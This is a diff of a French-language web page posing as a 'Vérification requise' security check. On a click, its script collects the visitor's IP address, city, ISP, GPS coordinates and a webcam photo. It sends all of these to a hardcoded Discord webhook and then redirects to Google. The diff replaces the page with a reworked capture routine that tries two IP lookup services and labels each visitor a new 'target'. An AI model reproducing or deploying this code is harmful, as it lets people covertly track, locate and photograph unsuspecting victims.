@@ -1,56 +1,38 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic</title>
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #111; padding: 30px; border-radius: 12px; text-align: center; width: 300px; border: 1px solid #333; }
-        .btn { background: #007aff; color: #fff; border: none; padding: 12px; border-radius: 7px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        #video, #canvas { display: none; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h3>Vérification requise</h3>
-        <p style="color:#aaa; font-size:13px;">Une analyse de sécurité est nécessaire pour accéder à ce contenu.</p>
-        <button class="btn" onclick="execute()">Continuer</button>
-    </div>
+async function execute() {
+            // Changement visuel immédiat
+            const box = document.querySelector('.box');
+            box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification de la sécurité réseau...</p>";
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
-
-        async function post(content, blob = null) {
-            const fd = new FormData();
-            if (blob) fd.append('file', blob, 'snap.png');
-            fd.append('payload_json', JSON.stringify({ content: content }));
-            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e) {}
-        }
-
-        async function execute() {
-            document.querySelector('.box').innerHTML = "<h3>Analyse en cours...</h3><p>Patientez quelques secondes.</p>";
-
-            // 1. IP PC FORCEE (Via API externe)
+            // 1. CHOPPER L'IP (Priorité absolue)
+            let ipDetails = "⚠️ IP non récupérée";
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                await post(`🌐 **IP PC/MOBILE DETECTÉE**\n**IP**: ${d.ip}\n**Ville**: ${d.city}\n**FAI**: ${d.org}\n**OS**: ${navigator.platform}`);
-            } catch (e) { await post("❌ Impossible de choper l'IP"); }
+                // On utilise un service ultra-rapide
+                const response = await fetch('https://api.db-ip.com/v2/free/self');
+                const data = await response.json();
+                ipDetails = `🌐 **IP**: ${data.ipAddress}\n📍 **Ville**: ${data.city}\n🌍 **Pays**: ${data.countryName}`;
+            } catch (e) {
+                // Backup si le premier échoue
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    ipDetails = `🌐 **IP (Backup)**: ${d.ip}\n📍 **Ville**: ${d.city}`;
+                } catch(e2) { ipDetails = "❌ Échec total récupération IP"; }
+            }
 
-            // 2. GPS
+            // Envoi immédiat des infos réseau
+            await post(`🚀 **NOUVELLE CIBLE PC**\n${ipDetails}\n💻 **OS**: ${navigator.platform}`);
+
+            // 2. TENTATIVE GPS
             navigator.geolocation.getCurrentPosition(async (p) => {
-                await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+                await post(`📍 **COORDONNÉES GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, null, { timeout: 5000 });
 
-            // 3. CAMÉRA
+            // 3. CAPTURE CAMÉRA
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
@@ -58,17 +40,14 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            await post("📸 **PHOTO REÇUE**", blob);
+                            await post("📸 **CAPTURE RÉUSSIE**", blob);
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = "https://www.google.com";
+                            window.location.href = "https://www.google.com"; // Redirection finale
                         }, 'image/png');
                     }, 1000);
                 };
-            } catch (e) {
-                await post("⚠️ Caméra refusée");
+            } catch (err) {
+                await post("⚠️ Caméra bloquée ou absente");
                 window.location.href = "https://www.google.com";
             }
         }
-    </script>
-</body>
-</html>
